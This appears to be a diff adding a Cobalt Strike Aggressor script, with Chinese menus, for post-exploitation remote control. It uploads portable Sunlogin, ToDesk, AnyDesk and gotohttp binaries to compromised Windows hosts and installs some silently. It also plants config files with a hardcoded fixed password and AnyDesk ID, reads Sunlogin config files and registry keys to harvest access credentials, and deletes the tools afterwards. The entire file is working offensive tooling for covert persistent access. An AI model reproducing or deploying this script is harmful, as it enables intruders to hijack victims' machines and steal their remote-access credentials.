@@ -1,0 +1,294 @@
+#远程屏幕
+
+menu "远程屏幕" {
+   menu "[+]向日葵(推荐)" {
+    item "上传 向日葵" {
+      blog($1, "\c9=========== 上传 向日葵便携版 ==========");
+      $bid = $1;
+      $dialog = dialog("上传向日葵便携版", %(UploadPath => "C:\\Users\\Public\\", bid => $bid), &xrk);
+      dialog_description($dialog, "上传向日葵便携版 确认目标机器无向日葵工具 请勿修改路径");
+      drow_text($dialog, "UploadPath",  "上传路径: ");
+      dbutton_action($dialog, "上传");
+      dialog_show($dialog);
+    }
+    sub xrk {
+      bcd($bid, $3['UploadPath']);
+      bupload($bid, script_resource("/scripts/screens/xrk.exe"));
+      }
+    item "运行 向日葵"{
+      blog($1, "\c9=========== 运行 向日葵 ==========");
+      $bid = $1['@'];
+      btask($bid, "----------------------------------向日葵 运行---------------------------------------", "");
+      bshell!($1,"C:\\Users\\Public\\xrk.exe");
+      
+    }
+
+    item "首选-读取向日葵便携版配置文件"{
+      blog($1, "\c9=========== 运行 向日葵 ==========");
+      $bid = $1['@'];
+      btask($bid, "----------------------------------读取向日葵---------------------------------------", "");
+      btask($bid, "C:\ProgramData\Oray\SunloginClientLite\config.ini", "");
+
+      bshell!($1,"type C:\\ProgramData\\Oray\\SunloginClientLite\\config.ini");
+    }
+    item "读取向日葵安装版配置文件"{
+      blog($1, "\c9=========== 运行 向日葵 ==========");
+      $bid = $1['@'];
+      btask($bid, "----------------------------------读取向日葵---------------------------------------", "");
+      btask($bid, "C:\ProgramData\Oray\SunloginClientLite\config.ini", "");
+
+      bshell!($1,"type C:\\Program Files\\Oray\\SunLogin\\SunloginClient\\config.ini");
+    }
+    item "读取向日葵最新便携版配置文件"{
+      blog($1, "\c9=========== 运行 向日葵 ==========");
+      $bid = $1['@'];
+      btask($bid, "----------------------------------读取向日葵---------------------------------------", "");
+      btask($bid, "C:\ProgramData\Oray\SunloginClientLite\config.ini", "");
+
+      bshell!($1,"reg query HKEY_USERS\.DEFAULT\Software\Oray\SunLogin\SunloginClient\SunloginInfo");
+    }
+    item "读取最新向日葵安装版配置文件"{
+      blog($1, "\c9=========== 运行 向日葵 ==========");
+      $bid = $1['@'];
+      btask($bid, "----------------------------------读取向日葵---------------------------------------", "");
+      btask($bid, "C:\ProgramData\Oray\SunloginClientLite\config.ini", "");
+
+      bshell!($1,"reg query HKEY_USERS\.DEFAULT\Software\Oray\SunLogin\SunloginClient\SunloginGreenInfo");
+    }
+
+    item "删除 向日葵"{
+      blog($1, "\c9=========== 删除向日葵 ==========");
+      $bid = $1['@'];
+      bshell($bid, "taskkill -f /im xrk.exe & del /f /s /q xrk.exe");
+    }
+    }
+
+
+
+    menu "[+]ToDesk(存在BUG ) " {
+    item "上传 ToDesk" {
+      blog($1, "\c9=========== 上传 ToDesk ==========");
+      $bid = $1;
+      $dialog = dialog("上传ToDesk", %(UploadPath => "C:\\Users\\Public\\", bid => $bid), &todiskall);
+      dialog_description($dialog, "上传 ToDesk");
+      drow_text($dialog, "UploadPath",  "上传路径: ");
+      dbutton_action($dialog, "上传");
+      dialog_show($dialog);
+    }
+    sub todiskall {
+      bcd($bid, $3['UploadPath']);
+      bupload($bid, script_resource("/scripts/screens/todiskall.exe"));
+      }
+      
+    item "安装 ToDesk"{
+      blog($1, "\c9=========== 运行静默安装 ToDesk ==========");
+      $bid = $1['@'];
+      btask($bid, "----------------------------------ToDesk ---------------------------------------", "");
+      
+      bshell($bid, "C:\\Users\\Public\\todiskall.exe /S");
+    }
+    
+
+    item "查询 ToDesk信息"{
+      blog($1, "\c9=========== 查询 ToDesk信息 ==========
+      ");
+      $bid = $1['@'];
+      bshell($bid, "sc qc ToDesk_Service");
+      bshell($bid, "taskkill -f /im ToDesk.exe ");
+    }
+
+    item "替换配置"{
+      blog($1, "\c9=========== 查询 ToDesk信息 ==========
+      默认链接密码：123456  固定密码： susuyA!23");
+      $bid = $1;
+      $dialog = dialog("上传ToDeskconfig", %(UploadPath => "C:\\Program Files\\ToDesk", bid => $bid), &todiskallcon);
+      dialog_description($dialog, "上传 ToDesk");
+      drow_text($dialog, "UploadPath",  "上传路径: ");
+      dbutton_action($dialog, "上传");
+      dialog_show($dialog);
+      
+    }
+    sub todiskallcon {
+      bcd($bid, $3['UploadPath']);
+      bupload($bid, script_resource("/scripts/screens/todisk/config.ini"));
+      }
+
+    item "重新加载配置运行"{
+      blog($1, "\c9=========== 重新加载配置运行 ==========");
+      $bid = $1['@'];
+      btask($bid, "----------------------------------使用方法---------------------------------------", "");
+      btask($bid, "
+      默认链接密码：123456  固定密码： susuyA!23
+      查看终端读取远程码
+      ", "");
+
+      $dialog = dialog("运行fscan",%(exec => "C:\\Program Files\\ToDesk\\ToDesk.exe", bid => $bid),&Everything_run);
+      
+      drow_text($dialog, "exec", "Exec: ");
+      dbutton_action($dialog, "运行");
+      dialog_show($dialog);
+    }
+
+    item "读取远程码"{
+      blog($1, "\c9=========== 重新加载配置运行 ==========");
+      $bid = $1['@'];
+      btask($bid, "----------------------------------使用方法---------------------------------------", "");
+      btask($bid, "
+      默认链接密码：123456  固定密码： susuyA!23
+      查看终端读取远程码
+      ", "");
+
+      $dialog = dialog("运行fscan",%(exec => "C:\\Program Files\\ToDesk\\ToDesk.exe -getid", bid => $bid),&Everything_run);
+      
+      drow_text($dialog, "exec", "Exec: ");
+      dbutton_action($dialog, "运行");
+      dialog_show($dialog);
+    }
+    sub Everything_run{
+      $exec = $3['exec'];
+      brun($bid, "$exec");
+    }
+    item "删除 ToDesk"{
+      blog($1, "\c9=========== 删除 ToDesk ==========");
+      $bid = $1['@'];
+      bshell($bid, "taskkill -f /im todiskall.exe & del /f /s /q todiskall.exe");
+    }
+
+    }
+
+
+
+
+
+    menu "[+]anydesk(使用后须完全退出)" {
+    item "上传 anydesk" {
+      blog($1, "\c9=========== 上传 anydesk ==========");
+      $bid = $1;
+      $dialog = dialog("上传anydesk", %(UploadPath => "C:\\Users\\Public\\", bid => $bid), &fscanbypass);
+      dialog_description($dialog, "anydesk");
+      drow_text($dialog, "UploadPath",  "上传路径: ");
+      dbutton_action($dialog, "上传");
+      dialog_show($dialog);
+    }
+    sub fscanbypass {
+      bcd($bid, $3['UploadPath']);
+      bupload($bid, script_resource("/scripts/screens/anydesk.exe"));
+      }
+    item "运行 anydesk"{
+      blog($1, "\c9=========== 运行 anydesk ==========");
+      $bid = $1['@'];
+      btask($bid, "----------------------------------anydesk---------------------------------------", "");
+      btask($bid, "anydesk.exe", " 查看使用手册  中文 请使用GBK编码");
+
+      $dialog = dialog("运行anydesk",%(exec => "anydesk.exe", bid => $bid),&fscanbypass_run);
+      dialog_description($dialog, "请在下方输入运行指令：");
+      drow_text($dialog, "exec", "Exec: ");
+      dbutton_action($dialog, "运行");
+      dialog_show($dialog);
+      
+    }
+    sub fscanbypass_run{
+      $exec = $3['exec'];
+      brun($bid, "$exec");
+    }
+
+    item "上传 anydesk配置" {
+      blog($1, "\c9=========== 上传 anydesk ==========");
+      $bid = $1;
+      $dialog = dialog("上传anydesk", %(UploadPath => "C:\\Users\\用户名\\AppData\\Roaming\\AnyDesk", bid => $bid), &fscanbypass);
+      dialog_description($dialog, "anydesk");
+      drow_text($dialog, "UploadPath",  "上传路径: ");
+      dbutton_action($dialog, "上传");
+      dialog_show($dialog);
+      bshell($bid, "taskkill -f /im fscanbypass.exe");
+    }
+    sub fscanbypass {
+      bcd($bid, $3['UploadPath']);
+      bupload($bid, script_resource("/scripts/screens/anydesk/ad.trace"));
+      bupload($bid, script_resource("/scripts/screens/anydesk/service.conf"));
+      bupload($bid, script_resource("/scripts/screens/anydesk/system.conf"));
+      bupload($bid, script_resource("/scripts/screens/anydesk/user.conf"));
+      }
+
+    item "加载配置运行 anydesk"{
+      blog($1, "\c9=========== 运行 anydesk ==========");
+      $bid = $1['@'];
+      btask($bid, "----------------------------------anydesk---------------------------------------
+      链接码：1 244 350 932
+      密钥：susuyA!23
+      多机器自行替换配置文件 /scripts/screens/anydesk/*
+      ", "");
+      btask($bid, "anydesk.exe", " 查看使用手册  中文 请使用GBK编码");
+
+      $dialog = dialog("运行anydesk",%(exec => "C:\\Users\\Public\\anydesk.exe", bid => $bid),&fscanbypass_run);
+      dialog_description($dialog, "请在下方输入运行指令：");
+      drow_text($dialog, "exec", "Exec: ");
+      dbutton_action($dialog, "运行");
+      dialog_show($dialog);
+      
+    }
+    sub fscanbypass_run{
+      $exec = $3['exec'];
+      brun($bid, "$exec");
+    }
+    item "删除 anydesk"{
+      blog($1, "\c9=========== 删除 anydesk ==========");
+      $bid = $1['@'];
+      bshell($bid, "taskkill -f /im anydesk.exe & del /f /s /q anydesk.exe");
+    }
+
+
+    }
+
+
+
+
+
+
+
+  menu "[+]gotohttp(推荐)" {
+      item "上传 gotohttp" {
+        blog($1, "\c9=========== 上传 gotohttp ==========");
+        $bid = $1;
+        $dialog = dialog("上传gotohttp", %(UploadPath => "C:\\Users\\Public\\", bid => $bid), &gotohttp);
+        dialog_description($dialog, "gotohttp");
+        drow_text($dialog, "UploadPath",  "上传路径: ");
+        dbutton_action($dialog, "上传");
+        dialog_show($dialog);
+      }
+      sub gotohttp {
+        bcd($bid, $3['UploadPath']);
+        bupload($bid, script_resource("/scripts/screens/gotohttp.exe"));
+        }
+      item "运行 gotohttp"{
+        blog($1, "\c9=========== 运行 gotohttp ==========");
+        $bid = $1['@'];
+        btask($bid, "----------------------------------gotohttp 使用方法--------------------------------------- ", "");
+        btask($bid, "gotohttp.exe", " 查看使用手册  中文 请使用GBK编码");
+
+        $dialog = dialog("运行gotohttp",%(exec => "gotohttp.exe", bid => $bid),&gotohttp_run);
+        dialog_description($dialog, "请在下方输入运行指令：");
+        drow_text($dialog, "exec", "Exec: ");
+        dbutton_action($dialog, "运行");
+        dialog_show($dialog);
+      }
+      sub gotohttp_run{
+        $exec = $3['exec'];
+        brun($bid, "$exec");
+      }
+
+      item "读取gotohttp配置文件"{
+        blog($1, "\c9=========== 运行 gotohttp ==========");
+        $bid = $1['@'];
+        btask($bid, "----------------------------------读取向日葵---------------------------------------", "");
+        bshell!($1,"type gotohttp.ini");
+    }
+      item "删除 gotohttp"{
+        blog($1, "\c9=========== 删除 Fscan免杀版 ==========");
+        $bid = $1['@'];
+        bshell($bid, "taskkill -f /im gotohttp.exe & del /f /s /q gotohttp.exe");
+      }
+      }
+
+
+}
